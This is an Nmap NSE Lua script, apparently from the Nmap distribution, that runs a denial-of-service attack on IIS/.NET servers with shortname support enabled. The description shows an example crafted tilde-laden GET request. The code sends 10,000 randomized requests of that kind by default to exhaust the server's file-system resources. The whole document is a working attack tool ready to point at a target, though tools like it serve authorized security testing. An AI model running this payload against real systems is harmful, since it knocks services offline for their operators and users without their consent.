description = [[
http-iis-shortname-dos launches a Denial of Service attack that exploits a vulnerability in IIS/.NET installations with shortname support enabled.

This script sends specially crafted requests to cause the target to make numerous file system calls and run out of resources. A request looks like this:

GET /190~0/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/
    ~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/~8/nMaP~.AsPx?aspxerrorpath=/ HTTP/1.1

* Tested on .NET 4 with IIS 7

References:
* http://soroush.secproject.com/downloadable/iis_tilde_dos.txt
* http://support.microsoft.com/kb/142982/en-us

Todo:
* Add monitoring check to see if target got DoSed and report properly.
]]
 
---
-- @usage nmap -p80,443 --script http-iis-shortname-dos <target>
--
-- @output No output
--
-- @args http-iis-shortname-dos.basepath Base path to use in requests (default: /).
-- @args http-iis-shortname-dos.reqs Number of requests to send (default: 10000).
--
---
 
author = "Paulino <calderon@websec.mx>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"dos"}
 
local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
portrule = shortport.http
 
local function repeater(str, n)
        return n > 0 and str .. repeater(str, n-1) or ""
end
 
action = function(host, port)
  local basepath = stdnse.get_script_args(SCRIPT_NAME..".basepath") or "/"
  local payload = nil
  local iterations = stdnse.get_script_args(SCRIPT_NAME..".reqs") or 10000    
  local orig_payload = payload
  for i=0,iterations do
    payload = basepath .. tostring(math.random(100,999)) .. "~" .. tostring(math.random(0,9)) .."/".. 
              repeater("~"..tostring(math.random(1,9)).."/",math.random(50,200)).."nM~.AsPx?aspxerrorpath=/"
    local req = http.get(host, port, payload, {no_cache=true})
    stdnse.print_debug(2, "Request #%d returned status code:%d", i, req.status)
  end
end
